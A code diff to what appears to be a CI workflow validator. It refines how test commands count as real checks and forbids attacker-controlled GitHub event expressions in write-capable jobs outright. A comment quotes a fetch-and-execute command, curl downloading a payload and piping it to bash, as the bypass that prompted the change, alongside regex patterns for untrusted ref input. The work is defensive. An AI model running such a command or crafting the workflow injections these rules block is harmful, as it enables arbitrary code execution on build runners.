@@ -110,11 +110,27 @@ const PRODUCT_CHECK_VERB = new Set([
   "bench", "exec", "start", "all"
 ]);
 
-function isProductCheckTarget(word) {
-  const bare = word.replace(/^["']|["']$/g, "");
-  if (!bare || bare.startsWith("-")) return false;
-  if (PRODUCT_CHECK_VERB.has(bare)) return true;
-  return bare.includes("/") || /\.[A-Za-z0-9]+$/.test(bare);
+// `npm run` lists the scripts and exits zero, so a verb that dispatches to a
+// named script is a target only once the name is there.
+const VERB_NEEDING_ARGUMENT = new Set(["run", "exec"]);
+
+function bareWord(word) {
+  return word.replace(/^["']|["']$/g, "");
+}
+
+function hasProductCheckTarget(words) {
+  return words.some((word, index) => {
+    const bare = bareWord(word);
+    if (!bare || bare.startsWith("-")) return false;
+    if (VERB_NEEDING_ARGUMENT.has(bare)) {
+      return words.slice(index + 1).some((next) => {
+        const following = bareWord(next);
+        return following && !following.startsWith("-");
+      });
+    }
+    if (PRODUCT_CHECK_VERB.has(bare)) return true;
+    return bare.includes("/") || /\.[A-Za-z0-9]+$/.test(bare);
+  });
 }
 
 const PRODUCT_CHECK_EXECUTABLE = new Set([
@@ -332,7 +348,7 @@ export function validateProductCheckCommand(command) {
     // real, so the command also has to carry a target — a subcommand that
     // runs project code, or a file to run. An unusual verb is not a dead end:
     // point the check at a script and the file itself is the target.
-    if (!words.slice(1).some(isProductCheckTarget)) {
+    if (!hasProductCheckTarget(words.slice(1))) {
       return "must execute a real product check";
     }
   }
@@ -695,13 +711,18 @@ const ALWAYS_UNTRUSTED_REF_INPUT = [
   /\bgh\s+pr\s+(?:checkout|diff|view)\b/
 ];
 
-// An actor-controlled expression is not dangerous by itself — the baseline's own
-// verification workflow compares `workflow_run.head_sha` as data and never
-// fetches with it. It becomes dangerous when the same shell can also acquire
-// code, so the expression is refused only alongside a tool that can.
+// Pairing the expression with a tool that can fetch code was the last denylist
+// standing: it knew `git` and `gh repo clone`, so
+// `curl -o payload "$URL" && bash payload` walked straight through it. Every
+// runner carries a dozen ways to turn a URL into a file and a file into a
+// process, so the tool half of the test is gone. An actor-controlled
+// expression may not reach a write-capable job's environment or shell at all —
+// then nothing there can be fed one, whatever it invokes. A trusted script
+// that needs event data reads `$GITHUB_EVENT_PATH`, where the payload is data
+// and never becomes a shell word; `scripts/verify-baseline-source.mjs` is the
+// baseline's own instance of that.
 const ACTOR_CONTROLLED_REF_EXPRESSION =
   /\$\{\{[^}]*(?:github\.event\.(?:issue|comment|pull_request|client_payload|workflow_run)|github\.head_ref)\b/;
-const REF_ACQUIRING_TOOL = /(?:^|[\s;&|(])(?:[^\s;&|(]*\/)?(?:git(?:\s|$)|gh\s+repo\s+clone\b)/;
 
 // A backslash-newline is a line continuation: the shell sees one command, so
 // the scan must too.
@@ -727,15 +748,11 @@ function environmentRefExpression(node) {
 }
 
 function stepNamesActorControlledRef(step, refExpressionInScope) {
+  if (refExpressionInScope || environmentRefExpression(step)) return true;
   const run = mapPair(step, "run")?.value;
-  const hasRun = isScalar(run) && typeof run.value === "string";
-  const stepEnvExpression = environmentRefExpression(step);
-  if (hasRun && alwaysUntrustedInput(run.value)) return true;
-  if (!hasRun) return false;
-  const text = joinShellContinuations(run.value);
-  const expressionAvailable =
-    refExpressionInScope || stepEnvExpression || ACTOR_CONTROLLED_REF_EXPRESSION.test(text);
-  return expressionAvailable && REF_ACQUIRING_TOOL.test(text);
+  if (!isScalar(run) || typeof run.value !== "string") return false;
+  if (alwaysUntrustedInput(run.value)) return true;
+  return ACTOR_CONTROLLED_REF_EXPRESSION.test(joinShellContinuations(run.value));
 }
 
 function changeDirectoryDestinations(text) {
